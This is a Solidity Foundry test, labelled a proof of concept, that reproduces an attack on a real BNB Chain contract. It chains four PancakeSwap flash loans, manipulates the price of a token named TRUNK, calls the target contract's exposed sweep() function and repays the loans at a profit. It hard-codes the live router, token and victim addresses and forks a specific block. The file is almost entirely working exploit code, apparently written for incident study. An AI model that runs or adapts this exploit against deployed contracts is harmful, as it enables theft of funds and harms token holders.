// SPDX-License-Identifier: MIT
// POC written by tphw
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract POC is Test {
    
    /////////////////////////////////// Resources ////////////////////////////////////////////
    IPancakeV2Router02 router = IPancakeV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IWBNB wbnb = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 trunk = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);
    IVulnerable vulnerable = IVulnerable(0x6839e295a8f13864A2830fA0dCC0F52e71a82DbF);
    
    // FlashLoan Pools and Borrow Amounts
    address pool1 = 0xa0Ee789a8F581CB92dD9742ed0B5d54a0916976C;
    address pool2 = 0xB72723e36a83FB5Fe1793f06b436F4720F5DE4F9;
    address pool3 = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;
    address pool4 = 0xc15fa3E22c912A276550F3E5FE3b0Deb87B55aCd;

    uint256 borrow_amount1;
    uint256 borrow_amount2;
    uint256 borrow_amount3;
    uint256 borrow_amount4;


    function setUp() public {
        vm.createSelectFork("bsc",	41464000);
        borrow_amount1 = 1200000 ether;
        borrow_amount2 = 3700000 ether;
        borrow_amount3 = 2600000 ether;
        borrow_amount4 = 1500000 ether;
    }
    
    function testFlaw() public {

        uint256 trunkPrice_before = getTrunkPrice(address(trunk), address(busd));
        console.log("Attacker busd balance before exploit:", busd.balanceOf(address(this)) / 1 ether);
        console.log("Trunk price before the exploit: 0.88 >>> ", trunkPrice_before);    

        bytes memory pool1_data = abi.encode(pool1, pool2, pool3, pool4, borrow_amount1,borrow_amount2, borrow_amount3, borrow_amount4);
        IPancakePair(pool1).swap(0, borrow_amount1, address(this), pool1_data);
        
        uint256 trunkPrice_after = getTrunkPrice(address(trunk), address(busd));
        console.log("Attacker busd balance after exploit:", busd.balanceOf(address(this)) / 1 ether, "busd"); 
        console.log("Trunk price after the exploit: 0.62 >>> ", trunkPrice_after); 

    }
    function pancakeCall(address sender, uint amountOut0, uint amountOut1, bytes calldata data)  external {
        (address p1, address p2, address p3, address p4, uint256 borrow1, uint256 borrow2, uint256 borrow3, uint256 borrow4) = abi.decode
        (data, (address, address, address , address , uint256 , uint256, uint256, uint256));
        if (p1 == pool1 ) {
            bytes memory pool2_data = abi.encode(p2, p1, p3 , p4, borrow1, borrow2, borrow3, borrow4);
            IPancakePair(pool2).swap(0, borrow2, address(this), pool2_data);}
        if (p1 == pool2) {
            bytes memory pool3_data = abi.encode(p3, p2, p1, p4, borrow1, borrow2, borrow3, borrow4);
            IPancakePair(pool3).swap(0, borrow3, address(this), pool3_data);}
        if (p1 == pool3) {
            bytes memory pool4_data = abi.encode(p4, p2, p3 , p1, borrow1, borrow2, borrow3, borrow4);
            IPancakePair(pool4).swap(0, borrow4, address(this), pool4_data);}
        if (p1 == pool4) {
            
            tokenToWbnb(7000000 ether, address(busd));
            exactTokenToToken(address(busd), address(trunk), address(this), 2000000 ether);   
            vulnerable.sweep();
            wbnbToToken(wbnb.balanceOf(address(this)), address(busd));
            exactTokenToToken(address(trunk), address(busd), address(this), trunk.balanceOf(address(this)));
            
            uint fee1 = borrow1 * 3 / 997 ;
            uint devolution1 = borrow1 + fee1; 
            busd.transfer(address(pool1), devolution1); 
            uint fee2 = borrow2 * 3 / 997 ;
            uint devolution2 = borrow2 + fee2; 
            busd.transfer(address(pool2), devolution2);         
            uint fee3 = borrow3 * 3 / 997 ;
            uint devolution3 = borrow3 + fee3; 
            busd.transfer(address(pool3), devolution3);       
            uint fee4 = borrow4 * 3 / 997 ;
            uint devolution4 = borrow4 + fee4; 
            busd.transfer(address(pool4), devolution4);
        }
    }
    function wbnbToToken(uint256 _amount, address _token) internal  {
        wbnb.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = _token;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            _amount, 0, path, address(this), block.timestamp
        );
    }
    function tokenToWbnb(uint256 _amount, address _token) internal {
        IERC20(_token).approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = _token;
        path[1] = address(wbnb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            _amount, 0, path, address(this), block.timestamp
        );
    }
    function exactTokenToToken(address _exactToken, address _token, address _to, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = _exactToken;
        path[1] = _token;
        IERC20(_exactToken).approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, _to, block.timestamp);

    }
    function getTrunkPrice(address _token0, address _token1) internal view returns(uint256){
        address[] memory path = new address[](2);
        path[0] = _token0;
        path[1] = _token1;
        uint256 price = router.getAmountsOut(1 * 1e18, path)[1];
        return price;
    }

}
////////////////////////////////////// INTERFACES ///////////////////////////////////////////
interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}
interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IVulnerable is IERC20 {
    function sweep() external;
}
interface IPancakePair is IERC20 { 
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}
interface IPancakeV2Router02 {
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


